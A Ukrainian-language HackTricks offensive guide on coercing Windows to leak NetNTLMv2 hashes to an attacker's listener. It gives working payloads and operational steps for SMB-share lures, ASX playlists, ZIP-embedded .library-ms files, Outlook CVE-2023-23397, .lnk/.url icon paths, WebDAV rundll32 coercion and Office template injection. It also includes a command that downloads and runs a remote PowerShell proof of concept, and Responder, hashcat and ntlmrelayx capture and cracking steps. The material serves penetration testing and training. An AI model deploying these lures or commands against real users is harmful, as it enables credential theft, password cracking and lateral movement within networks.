# Місця для крадіжки NTLM облікових даних

{{#include ../../banners/hacktricks-training.md}}

**Перегляньте всі чудові ідеї з [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — від завантаження microsoft word-файлу онлайн до джерела ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md і [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Доступний для запису SMB share + UNC-приманки, що запускаються Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Якщо ви можете **записувати до share, який користувачі або заплановані завдання переглядають в Explorer**, розмістіть файли, метадані яких вказують на ваш UNC (наприклад, `\\ATTACKER\share`). Відображення папки запускає **неявну SMB-аутентифікацію** та надсилає **NetNTLMv2** до вашого listener.<sup>[[1]](#references)</sup>

1. **Створіть приманки** (охоплює SCF/URL/LNK/library-ms/desktop.ini/Office/RTF тощо)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Розмістіть їх у доступній для запису спільній папці** (у будь-якій папці, яку відкриває жертва):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Перехопити та crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows може одночасно обробляти кілька файлів; для всього, що Explorer попередньо переглядає (`BROWSE TO FOLDER`), не потрібно жодних натискань.

### Плейлисти Windows Media Player (.ASX/.WAX)

Якщо вам вдасться змусити ціль відкрити або попередньо переглянути створений вами плейлист Windows Media Player, ви можете зробити leak Net‑NTLMv2, вказавши в записі UNC-шлях. WMP спробує отримати вказаний медіафайл через SMB і автоматично пройде автентифікацію.<sup>[[3]](#references)[[4]](#references)</sup>

Приклад payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Процес збору та злому:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### Вбудований у ZIP .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer небезпечно обробляє файли .library-ms, коли їх відкривають безпосередньо з ZIP-архіву. Якщо визначення бібліотеки вказує на віддалений UNC-шлях (наприклад, \\attacker\share), простий перегляд або запуск .library-ms усередині ZIP змушує Explorer виконати перелік UNC-ресурсу та надіслати NTLM-автентифікацію attacker. У результаті отримується NetNTLMv2, який можна зламати offline або потенційно relayнути.<sup>[[2]](#references)</sup>

Мінімальний .library-ms, що вказує на UNC attacker
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Операційні кроки
- Створіть файл .library-ms із наведеним вище XML (вкажіть свою IP-адресу/hostname).
- Заархівуйте його (у Windows: Надіслати → Стиснута (zip) папка) та доставте ZIP цілі.
- Запустіть listener для захоплення NTLM і зачекайте, поки жертва відкриє .library-ms зсередини ZIP.


### Шлях до звуку нагадування календаря Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows обробляв розширену властивість MAPI PidLidReminderFileParameter в елементах календаря. Якщо ця властивість вказувала на UNC-шлях (наприклад, \\attacker\share\alert.wav), Outlook під час спрацювання нагадування підключався до SMB share, здійснюючи leak Net-NTLMv2 користувача без жодного кліку. Це було виправлено 14 березня 2023 року, але все ще має велике значення для застарілих/неоновлених флотів і під час historical incident response.<sup>[[5]](#references)</sup>

Швидка експлуатація за допомогою PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
На стороні listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Примітки
- Жертві достатньо, щоб Outlook for Windows був запущений у момент спрацювання нагадування.
- leak містить Net‑NTLMv2, придатний для offline cracking або relay (але не для pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer автоматично відображає іконки ярликів. Нещодавні дослідження показали, що навіть після квітневого патчу Microsoft 2025 року для UNC‑icon shortcuts усе ще можна було спровокувати NTLM authentication без жодних кліків, розмістивши target ярлика за UNC path і залишивши іконку локально (обхід патчу отримав ідентифікатор CVE‑2025‑50154). Простого перегляду папки достатньо, щоб Explorer отримав metadata від remote target і надіслав NTLM на SMB server атакувальника.<sup>[[6]](#references)</sup>

Мінімальний payload Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload ярлика програми (.lnk) через PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ідеї доставки
- Помістіть shortcut у ZIP-архів і змусьте жертву переглянути його.
- Розмістіть shortcut на доступному для запису share, який жертва відкриє.
- Об’єднайте його з іншими lure-файлами в тій самій папці, щоб Explorer попередньо переглянув елементи.

### No-click .LNK NTLM leak через шлях до іконки ExtraData (CVE‑2026‑25185)

Windows завантажує метадані `.lnk` під час **перегляду/попереднього перегляду** (рендерингу іконки), а не лише під час виконання. CVE‑2026‑25185 демонструє шлях парсингу, за якого блоки **ExtraData** змушують shell визначити шлях до іконки та звернутися до файлової системи **під час завантаження**, генеруючи вихідний NTLM, якщо шлях є віддаленим.

Ключові умови тригера (спостерігалися в `CShellLink::_LoadFromStream`):
- Додайте **DARWIN_PROPS** (`0xa0000006`) до ExtraData (умова переходу до процедури оновлення іконки).
- Додайте **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) із заповненим **TargetUnicode**.
- Завантажувач розгортає змінні середовища в `TargetUnicode` і викликає `PathFileExistsW` для отриманого шляху.

Якщо **TargetUnicode** перетворюється на UNC-шлях (наприклад, `\\attacker\share\icon.ico`), **простий перегляд папки**, що містить shortcut, спричиняє вихідну автентифікацію. Цей самий шлях завантаження також може бути активований **індексацією** та **AV-скануванням**, що робить його практичною поверхнею для no-click leak.<sup>[[7]](#references)</sup>

Інструменти для дослідження (parser/generator/UI) доступні в проєкті **LnkMeMaybe** для створення й перевірки цих структур без використання Windows GUI.<sup>[[8]](#references)</sup>


### Примусова WebDAV-автентифікація / перевірка облікових даних через `davclnt.dll,DavSetCookie`

Вбудований **WebDAV client** можна використати, щоб змусити поточну logon-сесію автентифікуватися на довільній кінцевій точці **HTTP/WebDAV**:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Чому це корисно:
- Проти **WebDAV-сервера, контрольованого атакувальником**, це може ініціювати **NTLM через HTTP** без розгортання власного клієнта.
- Проти **внутрішніх хостів** це непомітний спосіб **перевірити, де приймаються викрадені облікові дані**, перш ніж переходити до lateral movement.<sup>[[9]](#references)</sup>
- Команда є хорошою альтернативою, коли **вихідний SMB-трафік фільтрується**, але **HTTP/WebDAV** усе ще доступний.

Операційні примітки:
- Служба **WebClient** має працювати на вихідному хості.
- `rundll32.exe` завантажує `davclnt.dll` і змушує Windows обробляти автентифікацію WebDAV за допомогою **облікових даних поточного користувача**.<sup>[[10]](#references)</sup>
- Якщо ви вказуєте інфраструктуру, яку контролюєте, використовуйте HTTP-прослуховувач/relay із підтримкою NTLM, наприклад:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
З точки зору виявлення, повторювані запуски `rundll32.exe davclnt.dll,DavSetCookie` проти багатьох внутрішніх систем є надійним сигналом **перевірки облікових даних / підготовки до lateral movement, схожої на spray-атаку**, а не звичайної поведінки користувача.<sup>[[9]](#references)[[11]](#references)</sup>

### Віддалена ін’єкція шаблону Office (.docx/.dotm) для примусового NTLM

Документи Office можуть посилатися на зовнішній шаблон. Якщо вказати для приєднаного шаблону шлях UNC, відкриття документа призведе до автентифікації через SMB.

Мінімальні зміни зв’язків DOCX (у word/):

1) Відредагуйте word/settings.xml і додайте посилання на приєднаний шаблон:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Відредагуйте word/_rels/settings.xml.rels і вкажіть для rId1337 свій UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Перепакуйте у .docx і доставте. Запустіть свій SMB capture listener і зачекайте, поки файл відкриють.

Щодо ідей для post-capture relay або зловживання NTLM дивіться:

{{#ref}}
README.md
{{#endref}}


## Посилання
- [1] [HTB: Breach – приманки у writable share + захоплення Responder → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – auth leak через ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 до DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — NTLM leak через WMP → NTFS junction до webroot RCE → FullPowers + GodPotato до SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: невиправлені загрози підвищення привілеїв у Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft усуває Outlook EoP (CVE‑2023‑23397) і пояснює NTLM leak через PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: обхід security patch Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: огляд CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Інструментарій TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Коли телефонує IT Support: аналіз кампанії ModeloRAT — від Teams до компрометації домену](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – заголовковий файл davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – запит Windows Rundll32 до WebDAV](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
